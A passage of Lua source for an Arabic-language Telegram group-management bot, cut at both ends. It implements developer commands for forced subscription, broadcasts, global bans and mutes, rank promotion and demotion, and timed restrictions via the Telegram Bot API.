send(msg.chat_id_, msg.id_, "• تم تعطيل الاشتراك الاجباري ") 
return false  
end
if text == "الاشتراك الاجباري" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
if redis:get(bot_id..'add:ch:username') then
local addchusername = redis:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "• تم تفعيل الاشتراك الاجباري \n على القناة ⇠ ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, "• لا يوجد قناة في الاشتراك الاجباري ") 
end
return false  
end
if text == "اضف سوال كت تويت" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:set(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل السؤال الان ")
end
if text == "حذف سوال كت تويت" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."Tshakex:gamebot:List:Manager")
return send(msg.chat_id_, msg.id_,"تم حذف الاسئله")
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nتم حفظ السؤال بنجاح')
redis:set(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
redis:sadd(bot_id.."Tshakex:gamebot:List:Manager", text)
return false end
end
if text == "اضف سوال مقالات" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل السؤال الان ")
end
if text == "حذف سوال مقالات" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."makal:bots")
return send(msg.chat_id_, msg.id_,"تم حذف الاسئله")
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nتم حفظ السؤال بنجاح')
redis:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
redis:sadd(bot_id.."makal:bots", text)
return false end
end
if text == 'تغير كليشه ستارت' then
redis:set(bot_id..'Tshakex:Set:Cmd:Start:Bots',true) 
send(msg.chat_id_, msg.id_,'• ارسل الان الكليشه ليتم وضعها') 
end
if text == 'ازالة كليشه ستارت' then
redis:del(bot_id..'Tshakex:Set:Cmd:Start:Bot') 
send(msg.chat_id_, msg.id_,'• تم حذف كليشه ستارت') 
end
if text == "تفعيل مغادرة البوت" then   
redis:del(bot_id.."Tshakex:Lock:Left"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"• تم تفعيل مغادرة البوت") 
end
if text == "تعطيل مغادرة البوت" then  
redis:set(bot_id.."Tshakex:Lock:Left"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "• تم تعطيل مغادرة البوت") 
end
if text == "تفعيل الاذاعه" then  
redis:del(bot_id.."Tshakex:Broadcasting:Bot") 
send(msg.chat_id_, msg.id_,"• تم تفعيل الاذاعه \n• الان يمكن للمطور   الاذاعه" ) 
end
if text == "تعطيل الاذاعه" then  
redis:set(bot_id.."Tshakex:Broadcasting:Bot",true) 
send(msg.chat_id_, msg.id_,"• تم تعطيل الاذاعه") 
end
if text == 'تفعيل البوت الخدمي' then  
redis:del(bot_id..'Tshakex:Free:Bot') 
send(msg.chat_id_, msg.id_,'• تم تفعيل البوت الخدمي \n• الان يمكن الجميع تفعيله') 
end
if text == 'تعطيل البوت الخدمي' then  
redis:set(bot_id..'Tshakex:Free:Bot',true) 
send(msg.chat_id_, msg.id_,'• تم تعطيل البوت الخدمي') 
end
if text == 'تغير كليشة المطور' then
redis:set(bot_id..'Tshakex:GetTexting:DevSlbotss'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'•  ارسل لي الكليشه الان')
end
if text=="اذاعه خاص" then 
redis:setex(bot_id.."Tshakex:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي المنشور الان\n• يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n• لالغاء الاذاعه ارسل : الغاء") 
return false
end
if text=="اذاعه للمجموعات" then 
redis:setex(bot_id.."Tshakex:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي المنشور الان\n• يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n• لالغاء الاذاعه ارسل : الغاء") 
return false
end
if text=="اذاعه بالتوجيه" and DeveloperBot(msg) then 
redis:setex(bot_id.."Tshakex:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي التوجيه الان\n• ليتم افتاراته في المجموعات") 
return false
end
if text=="اذاعه خاص بالتوجيه" and DeveloperBot(msg) then 
redis:setex(bot_id.."Tshakex:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي التوجيه الان\n• ليتم افتاراته الى المشتركين") 
return false
end
if text == 'ازالة كليشة المطور' then
redis:del(bot_id..'Tshakex:Texting:DevSlbotss')
send(msg.chat_id_, msg.id_,'•  تم حذف كليشه مطور  ')
end
if text == "تغير اسم البوت" then 
redis:setex(bot_id.."Tshakex:Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"•  ارسل لي الاسم الان ")  
return false
end
if text == ("مسح قائمة العام") then
redis:del(bot_id.."Tshakex:Removal:User:Groups")
send(msg.chat_id_, msg.id_, "• تم مسح المحظورين عام من البوت")
end
if text == ("مسح المكتومين عام") then
redis:del(bot_id.."Tshakex:Silence:User:Groups")
send(msg.chat_id_, msg.id_, "• تم مسح المحظورين عام من البوت")
end
if text == ("مسح قائمة C") then
redis:del(bot_id.."Tshakex:Developer:Bot")
send(msg.chat_id_, msg.id_, "•  تم مسح قائمة C من البوت  ")
end
if text == ("مسح قائمة CM") then
redis:del(bot_id.."Tshakex:Developer:Bot")
send(msg.chat_id_, msg.id_, "•  تم مسح قائمة C من البوت  ")
end
if text == ("قائمة العام") then
local list = redis:smembers(bot_id.."Tshakex:Removal:User:Groups")
if #list == 0 then
return send(msg.chat_id_, msg.id_,"• لا يوجد محظورين عام")
end
Gban = "\n• قائمة المحظورين عام في البوت\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Gban = Gban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Gban)
end
end,nil)
end
end
if text == ("المكتومين عام") and Dev_Bots(msg) then
local list = redis:smembers(bot_id.."Tshakex:Silence:User:Groups")
if #list == 0 then
return send(msg.chat_id_, msg.id_,"• لا يوجد مكتومين عام")
end
Gban = "\n• قائمة المكتومين عام في البوت\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Gban = Gban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Gban)
end
end,nil)
end
end
if text == 'السورس' or text == 'سورس' then
Text = [[

🌐┇ Welcome to Source
🚩┇[ Tm   -  ”X”](t.me/TshakeX)
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
🦁┇[Tshake'X' TEAM](t.me/TshakeX)

📂┇[Source Files](t.me/TshakeX_files)

💠┇[Make BoT](t.me/TshakeMakeBOT)

📥┇[YouTube downloader](t.me/bhhBOT)

🔰┇[CHANNEL Tumblr](t.me/DDDDID)
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
[📮┇ConnectDeV](t.me/tshakebbot)

]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == ("قائمة C") and Dev_Bots(msg) then
local list = redis:smembers(bot_id.."Tshakex:Developer:Bot")
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مطور  ")
end
Sudos = "\n• قائمة مطور   في البوت \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Sudos = Sudos..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Sudos)
end
end,nil)
end
end
if text == ("قائمة CM") and Dev_Bots(msg) then
local list = redis:smembers(bot_id.."Tshakex:Developer:Bot1")
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مطور  ")
end
Sudos = "\n• قائمة مطور  في البوت \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Sudos = Sudos..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Sudos)
end
end,nil)
end
end
if text =='الاحصائيات' then 
send(msg.chat_id_, msg.id_,'*• عدد الاحصائيات الكامله \n━━━━━━━━\n• عدد المجموعات : '..(redis:scard(bot_id..'Tshakex:ChekBotAdd') or 0)..'\n• عدد المشتركين : '..(redis:scard(bot_id..'Tshakex:Num:User:Pv') or 0)..'*')
end
if text == 'حذف كليشه المطور' then
redis:del(bot_id..'Tshakex:Texting:DevSlbotss')
send(msg.chat_id_, msg.id_,'•  تم حذف كليشه المطور ')
end

if text == "مسح المشتركين" then
local pv = redis:smembers(bot_id..'Tshakex:Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem(bot_id..'Tshakex:Num:User:Pv',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'• لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*• عدد المشتركين الان ←{ '..#pv..' }\n• تم العثور على ←{ '..sendok..' } مشترك قام بحظر البوت\n• اصبح عدد المشتركين الان ←{ '..ok..' } مشترك *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح المجموعات" then
local group = redis:smembers(bot_id..'Tshakex:ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'• لا توجد مجموعات وهميه ')   
else
local yazon = (w + q)
local sendok = #group - yazon
if q == 0 then
yazon = ''
else
yazon = '\n•  تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
groupss = ''
else
groupss = '\n•  تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*•  عدد المجموعات الان ← { '..#group..' } مجموعه '..groupss..''..yazon..'\n• اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
return false
end
if text == 'جلب نسخه' then
GetFile_Bot(msg)
end
if text == 'تفعيل تواصل' then  
redis:del(bot_id..'Tshakex:Lock:Twasl') 
send(msg.chat_id_, msg.id_,'•  تم تفعيل التواصل ') 
end
if text == 'تعطيل تواصل' then  
redis:set(bot_id..'Tshakex:Lock:Twasl',true) 
send(msg.chat_id_, msg.id_,'•  تم تعطيل التواصل ') 
end
end 
end

---------------------------------------------------
if TypeForChat == ("ForSuppur") then
if text == "تحديث" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
dofile("Tshakex.lua")  
dofile("Info_Sudo.lua") 
send(msg.chat_id_, msg.id_, "تم تحديث ملفات البوت")
end
if text and text:match("^مسح صلاحيه عامه (.*)$") and Dev_Bots(msg) or text and text:match("^حذف صلاحيه (.*)$") and Dev_Bots(msg) then 
local ComdNew = text:match("^مسح صلاحيه عامه (.*)$") or text:match("^حذف صلاحيه (.*)$")
redis:del(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..ComdNew)
redis:srem(bot_id.."Tshakex:botsValiditys:Group"..msg.chat_id_,ComdNew)  
send(msg.chat_id_, msg.id_, "\n• تم مسح ← { "..ComdNew..' } من الصلاحيات العامه') 
return false 
end
if text and text:match("^اضف صلاحيه عامه (.*)$") and Dev_Bots(msg) then 
local ComdNew = text:match("^اضف صلاحيه عامه (.*)$")
redis:set(bot_id.."Tshakex:botsAdd:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
redis:sadd(bot_id.."Tshakex:botsValiditys:Group"..msg.chat_id_,ComdNew)  
redis:setex(bot_id.."Tshakex:botsRedis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "\n• ارسل نوع الصلاحيه كما مطلوب منك :\n• انواع الصلاحيات المطلوبه ← { عضو ، مميز  ، ادمن  ، مدير }") 
return false 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local mohammed = text:match("رفع (.*)")
tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(extra,result)
local statusrt = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..mohammed) or redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt"..mohammed..msg.chat_id_)
if  statusrt == "مميز" then
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر معل *')
end
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)")) 
redis:sadd(bot_id.."Tshakex:Vip:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "ادمن" then 
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر معل *')
end
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المدراء فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)"))
redis:sadd(bot_id.."Tshakex:Admin:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "مدير" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المنشئين فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,text:match("رفع (.*)"))  
redis:sadd(bot_id.."Tshakex:Manager:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "عضو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
return Send_Options(msg,result.sender_user_id_,"reply","• تم رفعه "..mohammed)  
end
end,nil)
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local mohammed = text:match("تنزيل (.*)")
local statusrt = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..mohammed) or redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt"..mohammed..msg.chat_id_)
tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(extra,result)
if  statusrt == "مميز" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,mohammed) 
redis:srem(bot_id.."Tshakex:Vip:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "ادمن" then 
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المدراء فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,mohammed)
redis:srem(bot_id.."Tshakex:Admin:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "مدير" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المنشئين فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_,mohammed)
redis:srem(bot_id.."Tshakex:Manager:Group"..msg.chat_id_,result.sender_user_id_)  
return Send_Options(msg,result.sender_user_id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "عضو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
return Send_Options(msg,result.sender_user_id_,"reply","• تم تنزيله "..mohammed)   
end
end,nil)
end
if text and text:match("^رفع (.*) @(.*)") then 
local Text = {string.match(text, "^(رفع) (.*) @(.*)$")}
local mohammed = Text[2]
local statusrt = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..mohammed) or redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt"..mohammed..msg.chat_id_)
tdcli_function({ID="SearchPublicChat",username_=Text[3]},function(extra,result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
return send(msg.chat_id_,msg.id_,"*• عذرا هاذا معرف قناة*")    
end
if statusrt == "مميز" then
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر معل *')
end
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:sadd(bot_id.."Tshakex:Vip:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "ادمن" then 
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر معل *')
end
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المدراء فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:sadd(bot_id.."Tshakex:Admin:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "مدير" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المنشئين فقط *')
end
redis:set(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:sadd(bot_id.."Tshakex:Manager:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم رفعه "..mohammed)  
elseif statusrt == "عضو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
return Send_Options(msg,result.id_,"reply","• تم رفعه "..mohammed)  
end
else
send(msg.chat_id_, msg.id_,"*• المعرف غلط لا يمكن استخراج معلوماته*")
end
end,nil)
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local Text = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
local mohammed = Text[2]
local statusrt = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..mohammed) or redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt"..mohammed..msg.chat_id_)
tdcli_function({ID="SearchPublicChat",username_=Text[3]},function(extra,result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
return send(msg.chat_id_,msg.id_,"*• عذرا هاذا معرف قناة*")    
end
if statusrt == "مميز" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:srem(bot_id.."Tshakex:Vip:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "ادمن" then 
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المدراء فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:srem(bot_id.."Tshakex:Admin:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "مدير" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : المنشئين فقط *')
end
redis:del(bot_id.."Tshakex:Add:Validity:Users"..msg.chat_id_..result.id_,mohammed)
redis:srem(bot_id.."Tshakex:Manager:Group"..msg.chat_id_,result.id_)  
return Send_Options(msg,result.id_,"reply","• تم تنزيله "..mohammed)  
elseif statusrt == "عضو" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• عذرآ هاذا الامر يخص : الادمنيه فقط *')
end
return Send_Options(msg,result.id_,"reply","• تم تنزيله "..mohammed)  
end
else
send(msg.chat_id_, msg.id_,"*• المعرف غلط لا يمكن استخراج معلوماته*")
end
end,nil)
end




if text and text:match('^تقييد (%d+) (.*) @(.*)$') and Admin(msg) then
local TextEnd = {string.match(text, "^(تقييد) (%d+) (.*) @(.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"• عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا هاذا معرف قناة")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n• لا تستطيع تقييد : "..Get_Rank(result.id_,msg.chat_id_).."")
else
Send_Options(msg,result.id_,"reply", "• تم تقييده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, FunctionStatus, nil)
end
if text and text:match('^تقييد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
local TextEnd = {string.match(text, "^(تقييد) (%d+) (.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"• عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n• لا تستطيع تقييد : "..Get_Rank(result.sender_user_id_,msg.chat_id_).."")
else
Send_Options(msg,result.sender_user_id_,"reply", "• تم تقييده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("حظر عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع حظر البوت عام")
return false 
end
if Dev_Bots_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور الاساسي عام")
return false 
end
if DeveloperBot12(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور الاساسي عام")
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","تم حظره عام من المجموعات")  
redis:sadd(bot_id.."Tshakex:Removal:User:Groups", result.sender_user_id_)
KickGroup(result.chat_id_, result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Removal:User:Groups", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم الغاء الحظره عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("كتم عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع كتم البوت عام")
return false 
end
if Dev_Bots_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع كتم المطور الاساسي عام")
return false 
end
if DeveloperBot12(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع كتم المطور الاساسي عام")
return false 
end

Send_Options(msg,result.sender_user_id_,"reply","تم كتمه عام من المجموعات")  
redis:sadd(bot_id.."Tshakex:Silence:User:Groups", result.sender_user_id_)
KickGroup(result.chat_id_, result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("الغاء الكتم العام") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Bots(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Silence:User:Groups", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم الغاء الكتمه عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
if redis:get(bot_id..'Tshakex:Lock:Ban:Group'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,'لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
